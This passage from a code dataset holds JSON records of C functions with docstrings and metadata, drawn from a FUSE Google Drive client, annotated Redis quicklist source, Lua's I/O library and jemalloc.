'%';\n\t\t\t\t++iter;\n\t\t\t\tsprintf(iter, \"%02X\", filenameunsafe[j]);\n\t\t\t\titer+=2;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\t// We did not need to escape the current character in filename, so just copy it\n\t\tif(j == sizeof(filenameunsafe))\n\t\t{\n\t\t\t*iter = filename[i];\n\t\t\t++iter;\n\t\t}\n\t}\n\n\t// Calculate the size of the final string, should be the same as (length+count*3)\n\tsize = iter - result;\n\t// Make sure we null terminate\n\tresult[size] = 0;\n\t// Save the new length\n\t*length = size;\n\n\treturn result;\n}", "path": "gd_cache.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Build linked list of files.\n *\n *  Calls the XML parsing code to get gd_fs_entry_ts for creating a list of files.\n *\n *  @xml   a string containing the xml to parse, this is what we get from curl\n *  @len   the length of xml\n *  @state the variable we store this mount's state in\n *\n *  @returns the link to the  next page of the directory listing, as found in xml\n */\n", "func_signal": "struct str_t* xml_parse_file_list(struct str_t* xml, struct gdi_state *state)", "code": "{\n\tchar* iter = strstr(xml->str, \"<feed\");\n\txmlDocPtr xmldoc = xmlParseMemory(iter, xml->len - (iter - xml->str));\n\n\txmlNodePtr node;\n\n\tsize_t count = 0;\n\tstruct gd_fs_entry_t *tmp = state->tail;\n\n\tstruct str_t* next = NULL;\n\n\tif(xmldoc == NULL || xmldoc->children == NULL || xmldoc->children->children == NULL)\n\t\treturn NULL;\n\tfor(node = xmldoc->children->children; node != NULL; node = node->next)\n\t{\n\t\tif(strcmp(node->name, \"entry\") == 0)\n\t\t{\n\t\t\tif(!tmp)\n\t\t\t{\n\t\t\t\ttmp = gd_fs_entry_from_xml(xmldoc, node);\n\t\t\t\tstate->head = tmp;\n\t\t\t\tstate->tail = tmp;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\ttmp->next = gd_fs_entry_from_xml(xmldoc, node);\n\t\t\t\ttmp = tmp->next;\n\t\t\t\tstate->tail = tmp;\n\t\t\t}\n\t\t\t++count;\n\t\t}\n\t\tif(strcmp(node->name, \"link\") == 0)\n\t\t{\n\t\t\tchar *prop = xmlGetProp(node, \"rel\");\n\t\t\tif(prop != NULL)\n\t\t\t{\n\t\t\t\tif(strcmp(prop, \"next\") == 0)\n\t\t\t\t{\n\t\t\t\t\tnext = (struct str_t*) malloc(sizeof(struct str_t));\n\t\t\t\t\tstr_init(next);\n\t\t\t\t\tnext->str = xmlGetProp(node, \"href\");\n\t\t\t\t\tnext->len = strlen(next->str);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\txmlFreeDoc(xmldoc);\n\tstate->num_files += count;\n\treturn next;\n}", "path": "gd_interface.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Gets a listing of all the files for this mount.\n *\n *  Calls curl repeatedly to get each page of xml from the directory-listing\n *  Google API. Then parses those pages into a list of gd_fs_entry_ts, stored\n *  in state.\n *\n *  @state the state for this mount\n *\n *  @returns void\n */\n", "func_signal": "void gdi_get_file_list(struct gdi_state *state)", "code": "{\n\tstruct str_t resp;\n\tresp.len = 0;\n\tresp.str = NULL;\n\n\tstruct str_t uri;\n\tstr_init_create(&uri, \"https://docs.google.com/feeds/default/private/full?v=3&showfolders=true&max-results=1000\", 0);\n\n\tstruct str_t* next = NULL;\n\n\tstruct request_t request;\n\tci_init(&request, &uri, 1, &state->oauth_header, NULL, GET);\n\tdo\n\t{\n\n\t\tci_request(&request);\n\n\t\tstr_destroy(next);\n\t\tfree(next);\n\t\tnext = xml_parse_file_list(&request.response.body, state);\n\t\tif(next)\n\t\t\tci_set_uri(&request, next);\n\n\t\tci_clear_response(&request);\n\t} while(next);\n\n\tci_destroy(&request);\n\tstr_destroy(&uri);\n}", "path": "gd_interface.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "/** Cleanup an entry.\n *\n *  @entry struct gd_fs_entry_t* the entry to uninitialize members for\n */\n", "func_signal": "void gd_fs_entry_destroy(struct gd_fs_entry_t* entry)", "code": "{\n\tstr_destroy(&entry->author);\n\tstr_destroy(&entry->author_email);\n\tstr_destroy(&entry->lastModifiedBy);\n\tstr_destroy(&entry->lastModifiedBy_email);\n\tstr_destroy(&entry->filename);\n\tstr_destroy(&entry->src);\n\tstr_destroy(&entry->feed);\n\tstr_destroy(&entry->cache);\n\tstr_destroy(&entry->md5);\n}", "path": "gd_cache.c", "repo_name": "jcline/fuse-google-drive", "stars": 281, "license": "gpl-2.0", "language": "c", "size": 275}
{"docstring": "//sz\u662f\u5426\u6ee1\u8db3\u5c0f\u4e8efill\u6240\u8981\u6c42\u7684\u6700\u5927\u503c\n", "func_signal": "REDIS_STATIC int\n_quicklistNodeSizeMeetsOptimizationRequirement(const size_t sz,\n                                               const int fill)", "code": "{\n    if (fill >= 0)\n        return 0;\n\n    //fill\u5c0f\u4e8e0\n    size_t offset = (-fill) - 1;    //\u6570\u7ec4\u7684\u504f\u79fb\u91cf\n\n    //static const size_t optimization_level[] = {4096, 8192, 16384, 32768, 65536};\n    //(sizeof(optimization_level) / sizeof(*optimization_level) \u6c42\u51fa\u6570\u7ec4\u7684\u5143\u7d20\u4e2a\u6570\n    //\u6570\u7ec4\u504f\u79fb\u91cf\u8981\u5c0f\u4e8e\u6570\u7ec4\u5143\u7d20\n    if (offset < (sizeof(optimization_level) / sizeof(*optimization_level))) {\n        if (sz <= optimization_level[offset]) {     //sz\u5c0f\u4e8e\u6839\u636efill\u7b97\u51fa\u7684\u7b49\u7ea7\uff0c\u8fd4\u56de1\n            return 1;\n        } else {\n            return 0;\n        }\n    } else {\n        return 0;\n    }\n}", "path": "quicklist.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/*\n** When creating file handles, always creates a `closed' file handle\n** before opening the actual file; so, if there is a memory error, the\n** file is not left opened.\n*/\n", "func_signal": "static FILE **newfile (lua_State *L)", "code": "{\n  FILE **pf = (FILE **)lua_newuserdata(L, sizeof(FILE *));\n  *pf = NULL;  /* file handle is currently `closed' */\n  luaL_getmetatable(L, LUA_FILEHANDLE);\n  lua_setmetatable(L, -2);\n  return pf;\n}", "path": "redis-3.2.8\\deps\\lua\\src\\liolib.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/* Release iterator.\n * If we still have a valid current node, then re-encode current node. */\n//\u91ca\u653e\u8fed\u4ee3\u5668\n", "func_signal": "void quicklistReleaseIterator(quicklistIter *iter)", "code": "{\n    if (iter->current)  //\u5982\u679c\u8be5\u8fed\u4ee3\u5668\u5df2\u7ecf\u548c\u4e00\u4e2aquicklistNode\u7ed3\u5408\n        quicklistCompress(iter->quicklist, iter->current);  //\u6309\u9700\u538b\u7f29entry\u8282\u70b9\n\n    zfree(iter);\n}", "path": "quicklist.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/*\n** this function has a separated environment, which defines the\n** correct __close for 'popen' files\n*/\n", "func_signal": "static int io_popen (lua_State *L)", "code": "{\n  const char *filename = luaL_checkstring(L, 1);\n  const char *mode = luaL_optstring(L, 2, \"r\");\n  FILE **pf = newfile(L);\n  *pf = lua_popen(L, filename, mode);\n  return (*pf == NULL) ? pushresult(L, 0, filename) : 1;\n}", "path": "redis-3.2.8\\deps\\lua\\src\\liolib.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/* Force 'quicklist' to meet compression guidelines set by compress depth.\n * The only way to guarantee interior nodes get compressed is to iterate\n * to our \"interior\" compress depth then compress the next node we find.\n * If compress depth is larger than the entire list, we return immediately. */\n//\u5982\u679cnode\u4e0d\u5728\u538b\u7f29\u7a0b\u5ea6\u7684\u8303\u56f4\u5185\uff0c\u5c31\u538b\u7f29\n", "func_signal": "REDIS_STATIC void __quicklistCompress(const quicklist *quicklist,\n                                      quicklistNode *node)", "code": "{\n    /* If length is less than our compress depth (from both sides),\n     * we can't compress anything. */\n    //\u5982\u679cquicklist\u4e0d\u80fd\u538b\u7f29\u6216\u8005\u538b\u7f29\u7a0b\u5ea6\u592a\u5927\u76f4\u63a5\u8fd4\u56de\n    //quicklist->compress * 2 \u5c31\u662f\u538b\u7f29\u8282\u70b9\u7684\u4e2a\u6570\uff0c\u4e0d\u80fd\u6bd4\u603b\u7ed3\u7684\u7684\u4e2a\u6570len\u8fd8\u8981\u591a\n    if (!quicklistAllowsCompression(quicklist) ||\n        quicklist->len < (unsigned int)(quicklist->compress * 2))\n        return;\n\n#if 0\n    /* Optimized cases for small depth counts */\n    if (quicklist->compress == 1) {\n        quicklistNode *h = quicklist->head, *t = quicklist->tail;\n        quicklistDecompressNode(h);\n        quicklistDecompressNode(t);\n        if (h != node && t != node)\n            quicklistCompressNode(node);\n        return;\n    } else if (quicklist->compress == 2) {\n        quicklistNode *h = quicklist->head, *hn = h->next, *hnn = hn->next;\n        quicklistNode *t = quicklist->tail, *tp = t->prev, *tpp = tp->prev;\n        quicklistDecompressNode(h);\n        quicklistDecompressNode(hn);\n        quicklistDecompressNode(t);\n        quicklistDecompressNode(tp);\n        if (h != node && hn != node && t != node && tp != node) {\n            quicklistCompressNode(node);\n        }\n        if (hnn != t) {\n            quicklistCompressNode(hnn);\n        }\n        if (tpp != h) {\n            quicklistCompressNode(tpp);\n        }\n        return;\n    }\n#endif\n\n    /* Iterate until we reach compress depth for both sides of the list.a\n     * Note: because we do length checks at the *top* of this function,\n     *       we can skip explicit null checks below. Everything exists. */\n\n    //\u538b\u7f29\uff1a\u538b\u7f29\u4e2d\u95f4\u7684\u8282\u70b9\uff0c\u6240\u4ee5\u4ece\u4e24\u8fb9\u5f00\u59cb\u5fd8\u4e2d\u95f4\u627e\u8282\u70b9\n    //\u8bb0\u5f55quicklistNode\u5934\u90e8\u8282\u70b9\u548c\u5c3e\u90e8\u8282\u70b9\u7684\u5730\u5740\n    quicklistNode *forward = quicklist->head;\n    quicklistNode *reverse = quicklist->tail;\n    int depth = 0;\n    int in_depth = 0;\n\n    //\u4ece\u4e24\u8fb9\u5f80\u4e2d\u95f4\u627e\uff0c\u627ecompress\u6b21\n    while (depth++ < quicklist->compress) {\n        //\u5982\u679c\u538b\u7f29\u8fc7\uff0c\u5219\u5c06\u5176\u89e3\u538b\u7f29\n        quicklistDecompressNode(forward);\n        quicklistDecompressNode(reverse);\n\n        //\u5982\u679c\u627e\u5230node\u8282\u70b9\u8bbe\u7f6e\u6807\u8bb0\n        if (forward == node || reverse == node)\n            in_depth = 1;\n\n        //\u5982\u679c\u4e24\u4e2a\u6307\u9488\u76f8\u9047\uff0c\u8fd4\u56de\n        if (forward == reverse)\n            return;\n\n        //\u66f4\u65b0\u6307\u9488\uff0c\u6307\u5411\u4e0b\u4e00\u4e2a\u8282\u70b9\n        forward = forward->next;\n        reverse = reverse->prev;\n    }\n\n    //\u5982\u679cnode\u4e0d\u5728\u4e24\u8fb9\u4e0d\u9700\u8981\u538b\u7f29\u7684\u8303\u56f4\u5185\uff0c\u5219\u8981\u538b\u7f29\u8fd9\u4e2a\u8282\u70b9\n    if (!in_depth)\n        quicklistCompressNode(node);\n\n    if (depth > 2) {    //\u538b\u7f29\u4e24\u4e2a\u6307\u9488\u6307\u5411\u7684\u8282\u70b9\n        /* At this point, forward and reverse are one node beyond depth */\n        quicklistCompressNode(forward);\n        quicklistCompressNode(reverse);\n    }\n}", "path": "quicklist.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/* Replace quicklist entry at offset 'index' by 'data' with length 'sz'.\n *\n * Returns 1 if replace happened.\n * Returns 0 if replace failed and no changes happened. */\n//\u4e0b\u6807\u4e3aindex\u7684entry\u88abdata\u66ff\u6362\n", "func_signal": "int quicklistReplaceAtIndex(quicklist *quicklist, long index, void *data,\n                            int sz)", "code": "{\n    quicklistEntry entry;\n    if (likely(quicklistIndex(quicklist, index, &entry))) { //\u627e\u5230\u4e0b\u6807\u4e3aindex\u7684entry\n        /* quicklistIndex provides an uncompressed node */\n        entry.node->zl = ziplistDelete(entry.node->zl, &entry.zi);  //\u5220\u9664\u88ab\u66ff\u6362\u7684entry\n        entry.node->zl = ziplistInsert(entry.node->zl, entry.zi, data, sz); //\u5728\u5220\u9664\u7684\u5730\u65b9\u63d2\u5165\u4e00\u4e2aentry\n        quicklistNodeUpdateSz(entry.node);          //\u66f4\u65b0quicklistNode\u8282\u70b9\u7684\u4fe1\u606f\n        quicklistCompress(quicklist, entry.node);   //\u6309\u9700\u538b\u7f29\n        return 1;\n    } else {\n        return 0;\n    }\n}", "path": "quicklist.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/*\n** function to (not) close the standard files stdin, stdout, and stderr\n*/\n", "func_signal": "static int io_noclose (lua_State *L)", "code": "{\n  lua_pushnil(L);\n  lua_pushliteral(L, \"cannot close standard file\");\n  return 2;\n}", "path": "redis-3.2.8\\deps\\lua\\src\\liolib.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/* Default pop function\n *\n * Returns malloc'd value from quicklist */\n//pop\u4e00\u4e2aentry\u503c\uff0c\u8c03\u7528quicklistPopCustom\uff0c\u5c01\u88c5\u8d77\u6765\n", "func_signal": "int quicklistPop(quicklist *quicklist, int where, unsigned char **data,\n                 unsigned int *sz, long long *slong)", "code": "{\n    unsigned char *vstr;\n    unsigned int vlen;\n    long long vlong;\n    if (quicklist->count == 0)\n        return 0;\n    int ret = quicklistPopCustom(quicklist, where, &vstr, &vlen, &vlong,\n                                 _quicklistSaver);  //pop\u51fa\u4e00\u4e2awhere\u4f4d\u7f6e\u7684entry\n\n    //\u5c06pop\u51fa\u7684\u503c\u4fdd\u5b58\u8d77\u6765\n    if (data)\n        *data = vstr;\n    if (slong)\n        *slong = vlong;\n    if (sz)\n        *sz = vlen;\n    return ret;\n}", "path": "quicklist.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/* Delete one entry from list given the node for the entry and a pointer\n * to the entry in the node.\n *\n * Note: quicklistDelIndex() *requires* uncompressed nodes because you\n *       already had to get *p from an uncompressed node somewhere.\n *\n * Returns 1 if the entire node was deleted, 0 if node still exists.\n * Also updates in/out param 'p' with the next offset in the ziplist. */\n//\u5220\u9664ziplist\u4e2d\u7684entry\uff0c\u5982\u679centry\u662f\u6700\u540e\u4e00\u4e2a\uff0c\u5219\u5220\u9664\u5f53\u524dquicklistNode\u8282\u70b9\uff0c\u8fd4\u56de1\uff0c\u6ca1\u6709\u5220\u9664\u5f53\u524d\u8282\u70b9\u5219\u8fd4\u56de0\n", "func_signal": "REDIS_STATIC int quicklistDelIndex(quicklist *quicklist, quicklistNode *node,\n                                   unsigned char **p)", "code": "{\n    int gone = 0;\n\n    node->zl = ziplistDelete(node->zl, p);  //\u5220\u9664p\u6307\u5411\u7684entry\n    node->count--;                          //\u66f4\u65b0\u8ba1\u6570\u5668\n    if (node->count == 0) {                 //\u5982\u679centry\u4e3a0\n        gone = 1;\n        __quicklistDelNode(quicklist, node);//\u5220\u9664\u5f53\u524d\u7684quicklistNode\u8282\u70b9\n    } else {\n        quicklistNodeUpdateSz(node);        //\u5426\u5219\u66f4\u65b0node\u4e2dziplist\u5927\u5c0fsz\n    }\n    quicklist->count--;                     //\u66f4\u65b0quicklist\u8868\u5934\u4e2d\u7684quicklistNode\u8282\u70b9\u8ba1\u6570\u5668\n    /* If we deleted the node, the original node is no longer valid */\n    return gone ? 1 : 0;\n}", "path": "quicklist.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "//\u6839\u636efill\u5224\u65ad\u4e24\u4e2aquicklistNode\u4e2d\u7684ziplist\u80fd\u5426\u5408\u5e76\uff0c\u8fd4\u56de1\u53ef\u4ee5\uff0c\u5426\u5219\u8fd4\u56de0\n", "func_signal": "REDIS_STATIC int _quicklistNodeAllowMerge(const quicklistNode *a,\n                                          const quicklistNode *b,\n                                          const int fill)", "code": "{\n    if (!a || !b)   //a\u548cb\u4efb\u610f\u4e00\u4e2a\u4e3a\u7a7a\u5219\u8fd4\u56de0\n        return 0;\n\n    /* approximate merged ziplist size (- 11 to remove one ziplist\n     * header/trailer) */\n    //\u8ba1\u7b97\u5408\u5e76\u540e\u7684\u5927\u5c0f\uff0c\u51cf\u53bb\u4ee5\u4e0b\u6210\u5458\n    //albtyes + zltail_offset + zllength + zlend = 11\n    unsigned int merge_sz = a->sz + b->sz - 11;\n    if (likely(_quicklistNodeSizeMeetsOptimizationRequirement(merge_sz, fill))) //merge_sz\u7b26\u5408fill\u914d\u7f6e\n        return 1;\n    else if (!sizeMeetsSafetyLimit(merge_sz))   //merge_sz\u8d85\u8fc7\u5b89\u5168\u5927\u5c0f\u7684\u754c\u9650\n        return 0;\n    else if ((int)(a->count + b->count) <= fill)    //\u5408\u5e76\u540e\u7684entry\u4e2a\u6570\u5c0f\u4e8efill\u6240\u9650\u5236\u7684\u4e2a\u6570\n        return 1;\n    else\n        return 0;\n}", "path": "quicklist.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/*\n** function to close regular files\n*/\n", "func_signal": "static int io_fclose (lua_State *L)", "code": "{\n  FILE **p = tofilep(L);\n  int ok = (fclose(*p) == 0);\n  *p = NULL;\n  return pushresult(L, ok, NULL);\n}", "path": "redis-3.2.8\\deps\\lua\\src\\liolib.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "//\u6700\u5927\u538b\u7f29\u7a0b\u5ea6\u4e3a2^16\uff0c\u56e0\u4e3acompress\u957f\u5ea6\u4e3a16\u4f4d\n", "func_signal": "void quicklistSetCompressDepth(quicklist *quicklist, int compress)", "code": "{    //\u8bbe\u7f6e\u538b\u7f29\u7a0b\u5ea6\n    if (compress > COMPRESS_MAX) {\n        compress = COMPRESS_MAX;\n    } else if (compress < 0) {      //\u5c0f\u4e8e0\u4e5f\u4e0d\u538b\u7f29\n        compress = 0;\n    }\n    quicklist->compress = compress;\n}", "path": "quicklist.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/* Create a new quicklist with some default parameters. */\n//\u521b\u5efa\u4e00\u4e2aquicklist\uff0c\u5e76\u4e14\u8bbe\u7f6e\u9ed8\u8ba4\u7684\u53c2\u6570\n", "func_signal": "quicklist *quicklistNew(int fill, int compress)", "code": "{\n    quicklist *quicklist = quicklistCreate();\n    quicklistSetOptions(quicklist, fill, compress);\n    return quicklist;\n}", "path": "quicklist.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/* Return the UNIX time in microseconds */\n", "func_signal": "static long long ustime(void)", "code": "{\n    struct timeval tv;\n    long long ust;\n\n    gettimeofday(&tv, NULL);\n    ust = ((long long)tv.tv_sec) * 1000000;\n    ust += tv.tv_usec;\n    return ust;\n}", "path": "quicklist.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/* Return cached quicklist count */\n//\u8fd4\u56deziplist\u4e2dentry\u8282\u70b9\u7684\u4e2a\u6570\n", "func_signal": "unsigned int quicklistCount(quicklist *ql)", "code": "{ return ql->count; }\n\n/* Free entire quicklist. */\n//\u91ca\u653e\u6574\u4e2aquicklist\nvoid quicklistRelease(quicklist *quicklist) {\n    unsigned long len;\n    quicklistNode *current, *next;\n\n    current = quicklist->head;\n    len = quicklist->len;       //\u8bb0\u5f55quicklistNode\u8282\u70b9\u4e2a\u6570\n    while (len--) {\n        next = current->next;   //\u5907\u4efd\u540e\u7ee7\u8282\u70b9\u5730\u5740\n\n        zfree(current->zl);     //\u91ca\u653e\u5f53\u524d\u8282\u70b9\u7684ziplist\u7ed3\u6784\n        quicklist->count -= current->count; //\u4ecequicklist\u7684entry\u8ba1\u6570\u5668\u51cf\u53d6\u5f53\u524d\u8282\u70b9\u4e2d\u7684entry\u4e2a\u6570\n\n        zfree(current);         //\u91ca\u653e\u5f53\u524dquicklistNode\u8282\u70b9\n\n        quicklist->len--;       //\u66f4\u65b0quicklistNode\u8282\u70b9\u8ba1\u6570\u5668\n        current = next;         //\u6307\u5411\u540e\u7ee7\u8282\u70b9\n    }\n    zfree(quicklist);           //\u91ca\u653e\u6574\u4e2aquicklist\n}", "path": "quicklist.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/******************************************************************************/\n", "func_signal": "static extent_node_t *\nhuge_node_get(const void *ptr)", "code": "{\n\textent_node_t *node;\n\n\tnode = chunk_lookup(ptr, true);\n\tassert(!extent_node_achunk_get(node));\n\n\treturn (node);\n}", "path": "redis-3.2.8\\deps\\jemalloc\\src\\huge.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/* Delete a range of elements from the quicklist.\n *\n * elements may span across multiple quicklistNodes, so we\n * have to be careful about tracking where we start and end.\n *\n * Returns 1 if entries were deleted, 0 if nothing was deleted. */\n//\u5220\u9664\u4e00\u4e2a\u8303\u56f4\u5185\u7684entry\u8282\u70b9\uff0c\u8fd4\u56de1\u8868\u793a\u5168\u90e8\u88ab\u5220\u9664\uff0c\u8fd4\u56de0\u8868\u793a\u4ec0\u4e48\u90fd\u6ca1\u6709\u5220\u9664\n", "func_signal": "int quicklistDelRange(quicklist *quicklist, const long start,\n                      const long count)", "code": "{\n    if (count <= 0)\n        return 0;\n\n    //\u8bb0\u5f55\u5220\u9664\u7684\u4e2a\u6570\n    unsigned long extent = count; /* range is inclusive of start position */\n\n    //\u5982\u679cstart\u662f\u6b63\u6570\uff0c\u6b63\u5411\u5220\u9664\uff0c\u4e14\u5220\u9664\u7684\u4e2a\u6570\u5927\u4e8e\u603b\u8282\u70b9\u6570\n    if (start >= 0 && extent > (quicklist->count - start)) {\n        /* if requesting delete more elements than exist, limit to list size. */\n        extent = quicklist->count - start;  //\u5c06\u5220\u9664\u7684\u4e2a\u6570\u9650\u5236\u5230count\u8303\u56f4\u5185\n\n    //start\u662f\u8d1f\u6570\u65f6\uff0c\u53cd\u5411\u5220\u9664\uff0c\u5982\u679c\u5220\u9664\u7684\u6570\u76ee\u5927\u4e8e-start\uff0c\u5219\u5220\u9664\u5230\u672b\u5c3e\n    } else if (start < 0 && extent > (unsigned long)(-start)) {\n        /* else, if at negative offset, limit max size to rest of list. */\n        extent = -start; /* c.f. LREM -29 29; just delete until end. */\n    }\n\n    quicklistEntry entry;\n    if (!quicklistIndex(quicklist, start, &entry))  //\u5c06quicklistNode\u8282\u70b9\u4fe1\u606f\u8bfb\u53d6\u5230entry\u4e2d\n        return 0;\n\n    D(\"Quicklist delete request for start %ld, count %ld, extent: %ld\", start,\n      count, extent);\n    quicklistNode *node = entry.node;   //\u83b7\u53d6\u5f53\u524dquicklistNode\u8282\u70b9\u5730\u5740\n\n    /* iterate over next nodes until everything is deleted. */\n    //\u904d\u5386\u5220\u9664\u7684entry\u4e2a\u6570\n    while (extent) {\n        quicklistNode *next = node->next;   //\u5907\u4efd\u4e0b\u4e00\u8282\u70b9\u7684\u4fe1\u606f\n\n        unsigned long del;\n        int delete_entire_node = 0;\n        //\u5982\u679c\u5f53\u524d\u504f\u79fb\u91cf\u4e3a0\uff0c\u4e14\u8981\u5220\u9664\u7684\u4e2a\u6570\u5927\u4e8eentry\u7684\u4e2a\u6570\uff0c\u5219\u5220\u9664\u5168\u90e8entry\u8282\u70b9\n        if (entry.offset == 0 && extent >= node->count) {\n            /* If we are deleting more than the count of this node, we\n             * can just delete the entire node without ziplist math. */\n            delete_entire_node = 1;     //\u5168\u90e8\u5220\u9664\u7684\u6807\u8bc6\n            del = node->count;          //\u66f4\u65b0\u5220\u9664\u7684\u8282\u70b9\u6570\n\n        //\u5982\u679c\u662f\u4ece\u4e2d\u95f4\u5220\u9664\u5230\u5c3e\u8282\u70b9\n        } else if (entry.offset >= 0 && extent >= node->count) {\n            /* If deleting more nodes after this one, calculate delete based\n             * on size of current node. */\n            del = node->count - entry.offset;   //\u66f4\u65b0\u5220\u9664\u7684\u8282\u70b9\u6570\n\n        //\u5982\u679c\u504f\u79fb\u91cf\u4e3a\u8d1f\u6570\uff0c\u5219\u4ece\u5c3e\u8282\u70b9\u5411\u524d\u5220\u9664offset\u4e2a\u8282\u70b9\n        } else if (entry.offset < 0) {\n            /* If offset is negative, we are in the first run of this loop\n             * and we are deleting the entire range\n             * from this start offset to end of list.  Since the Negative\n             * offset is the number of elements until the tail of the list,\n             * just use it directly as the deletion count. */\n            del = -entry.offset;\n\n            /* If the positive offset is greater than the remaining extent,\n             * we only delete the remaining extent, not the entire offset.\n             */\n            if (del > extent)   //\u6700\u591a\u5220\u9664count\u4e2aentry\n                del = extent;\n        //\u5728\u4e2d\u95f4\u5220\u9664\u4e00\u90e8\u5206\n        } else {\n            /* else, we are deleting less than the extent of this node, so\n             * use extent directly. */\n            del = extent;   //\u4e00\u822c\u60c5\u51b5\uff0c\n        }\n\n        D(\"[%ld]: asking to del: %ld because offset: %d; (ENTIRE NODE: %d), \"\n          \"node count: %u\",\n          extent, del, entry.offset, delete_entire_node, node->count);\n\n        if (delete_entire_node) {   //\u5220\u9664\u6574\u4e2aziplist\u6807\u8bc6\u4e3a\u771f\uff0c\u5219\u5220\u9664\u6574\u4e2aquicklistNode\n            __quicklistDelNode(quicklist, node);\n        } else {\n            quicklistDecompressNodeForUse(node);    //\u4e34\u65f6\u89e3\u538b\u9001node\u8282\u70b9\n            node->zl = ziplistDeleteRange(node->zl, entry.offset, del); //\u5220\u9664\u8ba1\u7b97\u51fa\u7684\u8303\u56f4\u5185\u7684\u8282\u70b9\n            quicklistNodeUpdateSz(node);            //\u66f4\u65b0ziplist\u7684\u6253\u4e0bsz\n            node->count -= del;                     //\u66f4\u65b0quicklistNode\u7684entry\u8282\u70b9\u8ba1\u6570\u5668\n            quicklist->count -= del;                //\u66f4\u65b0quicklist\u8868\u5934\u7684\u603b\u7684entry\u8ba1\u6570\u5668\n            quicklistDeleteIfEmpty(quicklist, node);//\u5982\u679cziplist\u4e3a\u7a7a\uff0c\u5219\u5220\u9664quicklistNode\u8282\u70b9\n            if (node)                               //\u5982\u679c\u5f53\u524d\u8282\u70b9\u4e0d\u4e3a\u7a7a\uff0c\u5219\u8981\u91cd\u538b\u7f29\n                quicklistRecompressOnly(quicklist, node);\n        }\n\n        extent -= del;  //\u66f4\u65b0\u5220\u9664\u7684\u8ba1\u6570\u5668\n\n        node = next;    //\u6307\u5411\u4e0b\u4e00\u4e2a\u8282\u70b9\n\n        entry.offset = 0;   //\u91cd\u7f6e\u5f53\u524dquicklistEntry\u7684offset\uff0c\u4ee5\u4fbf\u4e0b\u6b21\u8bfb\u53d6\n    }\n    return 1;\n}", "path": "quicklist.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/* Attempt to merge ziplists within two nodes on either side of 'center'.\n *\n * We attempt to merge:\n *   - (center->prev->prev, center->prev)\n *   - (center->next, center->next->next)\n *   - (center->prev, center)\n *   - (center, center->next)\n */\n//\u5408\u5e76\u4ee5center\u4e3a\u4e2d\u5fc3\u7684\u5de6\u53f3\u4e24\u4e2a\u8282\u70b9\uff0c\u6700\u591a\u5c065\u4e2a\u8282\u70b9\u5408\u5e76\u4e3a1\u4e2a\n", "func_signal": "REDIS_STATIC void _quicklistMergeNodes(quicklist *quicklist,\n                                       quicklistNode *center)", "code": "{\n    int fill = quicklist->fill; //\u5907\u4efd\u914d\u7f6e\u7684ziplist\u7684\u5927\u5c0f\n    quicklistNode *prev, *prev_prev, *next, *next_next, *target;\n    prev = prev_prev = next = next_next = target = NULL;\n\n    //\u5907\u4efdcenter\u8282\u70b9\u7684prev\u8282\u70b9\u548cprev\u7684prev\u8282\u70b9\n    if (center->prev) {\n        prev = center->prev;\n        if (center->prev->prev)\n            prev_prev = center->prev->prev;\n    }\n\n    //\u5907\u4efdcenter\u8282\u70b9\u7684next\u8282\u70b9\u548cnext\u7684next\u8282\u70b9\n    if (center->next) {\n        next = center->next;\n        if (center->next->next)\n            next_next = center->next->next;\n    }\n\n    /* Try to merge prev_prev and prev */\n    //\u5982\u679c\u5141\u8bb8\u5408\u5e76\uff0c\u5408\u5e76prev_prev and prev\u8282\u70b9\n    if (_quicklistNodeAllowMerge(prev, prev_prev, fill)) {\n        _quicklistZiplistMerge(quicklist, prev_prev, prev);\n        prev_prev = prev = NULL; /* they could have moved, invalidate them. */\n    }\n\n    /* Try to merge next and next_next */\n    //\u5982\u679c\u5141\u8bb8\u5408\u5e76\uff0c\u5408\u5e76next and next_next\u8282\u70b9\n    if (_quicklistNodeAllowMerge(next, next_next, fill)) {\n        _quicklistZiplistMerge(quicklist, next, next_next);\n        next = next_next = NULL; /* they could have moved, invalidate them. */\n    }\n\n    /* Try to merge center node and previous node */\n    //\u5982\u679c\u5141\u8bb8\u5408\u5e76\uff0c\u5408\u5e76center\u548cprev\u8282\u70b9\n    if (_quicklistNodeAllowMerge(center, center->prev, fill)) {\n        target = _quicklistZiplistMerge(quicklist, center->prev, 